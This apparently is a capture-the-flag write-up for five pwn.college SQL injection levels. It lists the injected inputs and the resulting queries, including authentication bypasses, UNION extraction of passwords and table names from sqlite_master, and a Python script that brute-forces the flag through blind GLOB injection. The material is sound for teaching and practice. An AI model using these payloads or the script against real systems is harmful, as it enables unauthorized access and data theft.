# SQLi

## SQLi 1

User: `admin`
PIN: `1 OR 1=1`

SQL Query formed:

```sql
SELECT rowid, * FROM users WHERE username = 'admin' AND pin = 1 OR 1=1
```

## SQLi 2

User: `admin`
Password: `'pass OR '1'='1`

SQL Query formed:

```sql
SELECT rowid, * FROM users WHERE username = 'admin' AND password = 'pass' OR '1'='1'
```

## SQLi 3

Observing the server code we get to know that the password of the admin is the flag.

Query: admin" UNION SELECT password FROM users WHERE username LIKE "admin

SQL Query formed:

```sql
SELECT username FROM users WHERE username LIKE "admin" UNION SELECT password FROM users WHERE username LIKE "admin"
```

## SQLi 4

Since the server uses sqlite \
Query: admin" UNION SELECT tbl_name FROM sqlite_master WHERE tbl_name LIKE "users%

SQL Query formed (REDACTED is the randomized name of users table)

```sql
SELECT username FROM REDACTED WHERE username LIKE "admin" UNION SELECT tbl_name FROM sqlite_master WHERE tbl_name LIKE "users%"
```

This gives the name os the users table, now do same as [SQLi 3](./SQLi%203.md)

## SQLi 5

Python script:

```python
import requests

url = "http://challenge.localhost/"
username = "admin"
password = "' OR 1=1 AND password GLOB 'pwn.college{"

while True:
    for i in range(33,127):
        if chr(i) in ["*", "?"]:
            continue
        tmp = password + chr(i)
        data = {"username": username, "password": tmp+"*"}
        response = requests.post(url, data=data)
        if response.status_code == 200:
            password = tmp
            print(f"Found: {password}")
            if chr(i) == "}":
                exit(0)
            break
```

Using `GLOB` because `LIKE` is, by default, case-insensitive in SQLite.
